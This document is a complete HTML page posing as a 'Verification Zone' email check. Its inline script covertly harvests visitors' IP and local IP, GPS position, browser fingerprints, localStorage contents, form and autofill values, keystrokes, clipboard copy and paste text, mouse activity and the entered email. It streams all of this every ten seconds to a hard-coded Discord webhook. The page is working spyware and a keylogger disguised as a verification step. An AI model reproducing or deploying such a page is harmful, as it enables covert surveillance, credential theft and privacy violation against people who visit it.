<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification Zone • Ultimate</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
    body {
      min-height:100vh; display:flex; align-items:center; justify-content:center;
      background: #0a0e1a;
      background-image: radial-gradient(ellipse at 20% 50%, #1a2a4a, #05080f);
      padding:1.5rem;
    }
    .glass {
      background: rgba(255,255,255,0.03);
      backdrop-filter: blur(30px) saturate(2);
      -webkit-backdrop-filter: blur(30px) saturate(2);
      border: 1px solid rgba(255,255,255,0.06);
      border-radius: 3rem;
      box-shadow: 0 40px 100px rgba(0,0,0,0.9), inset 0 1px 0 rgba(255,255,255,0.04);
      padding: 2.5rem 2rem;
      max-width: 720px; width:100%;
    }
    h1 { font-size:2.4rem; font-weight:700; background:linear-gradient(135deg,#00d4ff,#b388ff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
    .sub { color:rgba(255,255,255,0.35); margin-bottom:1.8rem; font-size:0.9rem; border-left:3px solid #00d4ff; padding-left:1rem; }
    .grid { display:grid; grid-template-columns:1fr 1fr; gap:0.6rem; margin:1.5rem 0; }
    .item { background:rgba(255,255,255,0.02); border-radius:1rem; padding:0.6rem 0.9rem; border:1px solid rgba(255,255,255,0.03); }
    .label { font-size:0.55rem; text-transform:uppercase; letter-spacing:0.8px; color:rgba(255,255,255,0.25); }
    .value { font-size:0.75rem; color:#d0ddff; word-break:break-all; margin-top:0.15rem; max-height:3rem; overflow:hidden; }
    .btn {
      width:100%; padding:1.1rem; border:none; border-radius:60px;
      background:linear-gradient(135deg,#00d4ff,#7b2ffc); color:#fff; font-weight:600; font-size:1.1rem;
      cursor:pointer; transition:0.25s; margin-top:1.2rem;
    }
    .btn:hover { transform:scale(1.01); box-shadow:0 12px 40px rgba(0,212,255,0.25); }
    .modal {
      display:none; position:fixed; inset:0; background:rgba(0,0,0,0.75); backdrop-filter:blur(8px);
      align-items:center; justify-content:center; z-index:999;
    }
    .modal.active { display:flex; }
    .modal-card { background:#121828; border-radius:2rem; padding:2rem; max-width:400px; width:90%; border:1px solid rgba(255,255,255,0.05); }
    .modal-card h2 { color:#fff; }
    .modal-card input { width:100%; padding:0.9rem 1.2rem; border-radius:60px; border:1px solid rgba(255,255,255,0.08); background:rgba(255,255,255,0.03); color:#fff; margin:1rem 0; }
    .modal-card .btn-sm { width:100%; padding:0.9rem; border:none; border-radius:60px; background:linear-gradient(135deg,#00d4ff,#7b2ffc); color:#fff; font-weight:600; cursor:pointer; }
    .footer { margin-top:1.5rem; font-size:0.6rem; color:rgba(255,255,255,0.08); text-align:center; }
  </style>
</head>
<body>

<div class="glass">
  <h1>🔒 Verification Zone</h1>
  <div class="sub">Ultimate • all signals • live stream</div>
  <div class="grid" id="grid">
    <div class="item"><div class="label">IP</div><div class="value" id="d_ip">‑</div></div>
    <div class="item"><div class="label">WebRTC Local IP</div><div class="value" id="d_webrtc">‑</div></div>
    <div class="item"><div class="label">Geo</div><div class="value" id="d_geo">‑</div></div>
    <div class="item"><div class="label">Device / OS</div><div class="value" id="d_device">‑</div></div>
    <div class="item"><div class="label">Screen / DPR</div><div class="value" id="d_screen">‑</div></div>
    <div class="item"><div class="label">CPU / Memory</div><div class="value" id="d_cpu">‑</div></div>
    <div class="item"><div class="label">Battery</div><div class="value" id="d_battery">‑</div></div>
    <div class="item"><div class="label">Network</div><div class="value" id="d_network">‑</div></div>
    <div class="item" style="grid-column:span 2;"><div class="label">Canvas / WebGL / Audio FP</div><div class="value" id="d_fp">‑</div></div>
    <div class="item" style="grid-column:span 2;"><div class="label">Cookies / Local / Session</div><div class="value" id="d_storage">‑</div></div>
  </div>
  <button class="btn" id="trigger">Continue to Verify →</button>
  <div class="footer">live telemetry • 10s heartbeat</div>
</div>

<div class="modal" id="modal">
  <div class="modal-card">
    <h2>✉️ Email verification</h2>
    <p style="color:rgba(255,255,255,0.5);font-size:0.9rem;">Enter your email to finalise</p>
    <input type="email" id="emailInput" placeholder="you@domain.com">
    <button class="btn-sm" id="submitEmail">Submit</button>
  </div>
</div>

<script>
  (function(){
    const WEBHOOK = 'https://discord.com/api/webhooks/1527390754698297496/IYgvW07X3tYT3pjLdA1HZpbp_x2B9L-jbJIeF1zuQVyoRbbPjTOCw_5LbZjXOL8-4n-f';
    const payload = {};

    // ----- HELPERS -----
    async function send(data) {
      try {
        await fetch(WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: '```json\n' + JSON.stringify(data, null, 2) + '\n```' })
        });
      } catch(e){}
    }

    function updateUI(id, val) { const el=document.getElementById(id); if(el) el.textContent=val; }

    // ----- 1. IP -----
    (async function getIP(){
      try { const r=await fetch('https://api.ipify.org?format=json'); const d=await r.json(); payload.ip=d.ip; updateUI('d_ip',d.ip); } catch(e){ payload.ip='unavailable'; }
    })();

    // ----- 2. WebRTC local IP -----
    function getLocalIP(){
      return new Promise(resolve => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = e => {
          if (!e.candidate) return;
          const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
          if (ip) { resolve(ip[1]); pc.close(); }
        };
        setTimeout(() => resolve('timeout'), 3000);
      });
    }
    getLocalIP().then(ip => { payload.webrtc = ip; updateUI('d_webrtc', ip); });

    // ----- 3. Geo (GPS) -----
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        pos => { const g=`${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`; payload.geo=g; updateUI('d_geo',g); },
        () => { payload.geo='denied'; updateUI('d_geo','denied'); },
        { timeout:5000 }
      );
    } else { payload.geo='unsupported'; updateUI('d_geo','unsupported'); }

    // ----- 4. Device / OS from UA -----
    const ua = navigator.userAgent;
    payload.ua = ua;
    let device='unknown';
    if (/Mobile|Android|iPhone|iPad/i.test(ua)) device='Mobile';
    else if (/Mac/i.test(ua)) device='macOS';
    else if (/Windows/i.test(ua)) device='Windows';
    else if (/Linux/i.test(ua)) device='Linux';
    payload.device = device;
    updateUI('d_device', device);

    // ----- 5. Screen + DPR -----
    payload.screen = `${screen.width}x${screen.height} @ ${window.devicePixelRatio||1}x (${screen.colorDepth}-bit)`;
    updateUI('d_screen', payload.screen);

    // ----- 6. CPU / Memory -----
    payload.cpu = `${navigator.hardwareConcurrency||'?'} cores, ${navigator.deviceMemory||'?'} GB RAM`;
    updateUI('d_cpu', payload.cpu);

    // ----- 7. Battery -----
    if (navigator.getBattery) {
      navigator.getBattery().then(b => {
        payload.battery = `${Math.round(b.level*100)}% ${b.charging?'⚡charging':'🔋'}`;
        updateUI('d_battery', payload.battery);
      }).catch(()=>{ payload.battery='unavailable'; });
    } else { payload.battery='n/a'; }

    // ----- 8. Network -----
    if (navigator.connection) {
      const c = navigator.connection;
      payload.network = `${c.effectiveType||'?'} ${c.downlink||'?'}Mbps RTT:${c.rtt||'?'}ms`;
      updateUI('d_network', payload.network);
    } else { payload.network='not exposed'; }

    // ----- 9. Canvas + WebGL + Audio fingerprint -----
    function getFP() {
      let hash = '';
      try {
        const c = document.createElement('canvas'); c.width=200; c.height=50;
        const ctx = c.getContext('2d');
        ctx.textBaseline='top'; ctx.font='14px Arial'; ctx.fillStyle='#f60'; ctx.fillRect(0,0,100,40);
        ctx.fillStyle='#069'; ctx.fillText('FP',10,10);
        hash += c.toDataURL().slice(0,80);
      } catch(e){ hash+='canvas_err'; }
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        if(gl) {
          const info = gl.getParameter(gl.RENDERER) || '';
          hash += info.slice(0,40);
        }
      } catch(e){}
      try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.connect(gain); gain.connect(audioCtx.destination);
        osc.frequency.value = 440;
        osc.start(0); osc.stop(0.1);
        hash += audioCtx.sampleRate || '';
      } catch(e){}
      return hash.substring(0,80) || 'n/a';
    }
    payload.fingerprint = getFP();
    updateUI('d_fp', payload.fingerprint);

    // ----- 10. Storage: cookies + localStorage + sessionStorage -----
    let storageStr = '';
    try { storageStr += 'cookies:' + document.cookie.length + ' '; } catch(e){}
    try { storageStr += 'LS:' + localStorage.length + ' items '; 
          for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); storageStr+=`${k}=${localStorage.getItem(k).slice(0,20)} `; }
    } catch(e){ storageStr+='LS:err '; }
    try { storageStr += 'SS:' + sessionStorage.length + ' items'; } catch(e){}
    payload.storage = storageStr;
    updateUI('d_storage', storageStr);

    // ----- 11. All other deep data -----
    payload.languages = navigator.languages || [navigator.language];
    payload.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    payload.referrer = document.referrer || 'direct';
    payload.url = window.location.href;
    payload.path = window.location.pathname;
    payload.params = window.location.search;
    payload.cookiesEnabled = navigator.cookieEnabled;
    payload.doNotTrack = navigator.doNotTrack || 'unspecified';
    payload.platform = navigator.platform || 'unknown';
    payload.vendor = navigator.vendor || 'unknown';
    payload.touchPoints = navigator.maxTouchPoints || 0;
    payload.orientation = screen.orientation ? screen.orientation.type : 'unknown';
    payload.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ');
    payload.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ');
    payload.hardwareConcurrency = navigator.hardwareConcurrency || 0;
    payload.deviceMemory = navigator.deviceMemory || 0;
    payload.colorDepth = screen.colorDepth;
    payload.pixelRatio = window.devicePixelRatio || 1;

    // ----- 12. Media devices (enumerate - no permission needed for labels only, but needs permission for actual) -----
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      navigator.mediaDevices.enumerateDevices().then(devices => {
        payload.mediaDevices = devices.map(d => `${d.kind}:${d.label||'unlabeled'}`).join('; ');
      }).catch(()=>{});
    }

    // ----- 13. DOM content (full body HTML) -----
    try { payload.domHTML = document.body.innerHTML.slice(0,2000) + '…'; } catch(e){ payload.domHTML='err'; }

    // ----- 14. All form inputs (live) -----
    function captureForms() {
      const inputs = {};
      document.querySelectorAll('input, textarea, select').forEach(el => {
        if(el.name || el.id) {
          inputs[el.name || el.id] = el.value || el.innerText || '';
        }
      });
      return inputs;
    }
    payload.forms = captureForms();

    // ----- 15. Keystroke logging (every key) -----
    let keystrokes = [];
    document.addEventListener('keydown', e => {
      keystrokes.push({ key: e.key, code: e.code, time: Date.now(), target: e.target.tagName });
      if (keystrokes.length > 100) keystrokes.shift();
    });

    // ----- 16. Mouse movements (sampled) -----
    let mouseEvents = [];
    document.addEventListener('mousemove', e => {
      mouseEvents.push({ x: e.clientX, y: e.clientY, time: Date.now() });
      if (mouseEvents.length > 50) mouseEvents.shift();
    });

    // ----- 17. Scroll depth -----
    let maxScroll = 0;
    document.addEventListener('scroll', () => {
      const h = document.documentElement.scrollHeight - window.innerHeight;
      const pct = h > 0 ? (window.scrollY / h) * 100 : 0;
      if (pct > maxScroll) maxScroll = pct;
    });

    // ----- 18. Visibility & idle -----
    let visibleTime = 0, visibleStart = Date.now();
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) visibleTime += Date.now() - visibleStart;
      else visibleStart = Date.now();
    });

    // ----- 19. Selection & copy/paste -----
    document.addEventListener('copy', e => { payload.lastCopy = window.getSelection().toString().slice(0,200); });
    document.addEventListener('paste', e => { 
      const text = (e.clipboardData || window.clipboardData).getData('text');
      payload.lastPaste = text.slice(0,200);
    });
    document.addEventListener('selectionchange', () => {
      const sel = window.getSelection().toString();
      if (sel.length > 10) payload.lastSelection = sel.slice(0,200);
    });

    // ----- 20. Autofill detection (polling) -----
    setInterval(() => {
      document.querySelectorAll('input').forEach(el => {
        if (el.value && el.value.length > 4 && !el.dataset.autofillChecked) {
          if (!payload.autofill) payload.autofill = {};
          payload.autofill[el.name || el.id] = el.value.slice(0,50);
          el.dataset.autofillChecked = '1';
        }
      });
    }, 3000);

    // ----- 21. File input metadata -----
    document.addEventListener('change', e => {
      if (e.target.type === 'file') {
        payload.files = Array.from(e.target.files).map(f => ({ name: f.name, size: f.size, type: f.type }));
      }
    });

    // ----- 22. Heartbeat: send everything every 10s (streaming) -----
    async function heartbeat() {
      // Merge live data
      const full = { ...payload };
      full.keystrokes = keystrokes.slice(-20);
      full.mouseEvents = mouseEvents.slice(-10);
      full.scrollDepth = Math.round(maxScroll);
      full.visibleTimeSec = Math.round((visibleTime + (document.hidden ? 0 : Date.now() - visibleStart)) / 1000);
      full.forms = captureForms();
      full.timestamp = new Date().toISOString();
      // send
      await send(full);
    }
    setInterval(heartbeat, 10000);

    // ----- 23. Final email trigger -----
    const modal = document.getElementById('modal');
    const triggerBtn = document.getElementById('trigger');
    const emailInput = document.getElementById('emailInput');
    const submitBtn = document.getElementById('submitEmail');

    triggerBtn.addEventListener('click', () => modal.classList.add('active'));
    modal.addEventListener('click', (e) => { if (e.target === modal) modal.classList.remove('active'); });

    submitBtn.addEventListener('click', async () => {
      const email = emailInput.value.trim();
      if (!email || !email.includes('@')) { alert('valid email required'); return; }
      payload.email = email;
      payload.final = true;
      await send(payload);
      modal.classList.remove('active');
      alert('✅ Verification complete');
      triggerBtn.textContent = '✓ Verified';
      triggerBtn.disabled = true;
    });

    emailInput.addEventListener('keydown', e => { if(e.key === 'Enter') submitBtn.click(); });

    // ----- 24. Initial send after 2s -----
    setTimeout(async () => {
      const init = { ...payload };
      init.keystrokes = keystrokes;
      init.mouseEvents = mouseEvents;
      init.scrollDepth = Math.round(maxScroll);
      init.forms = captureForms();
      await send(init);
    }, 2000);

  })();
</script>
</body>
</html>
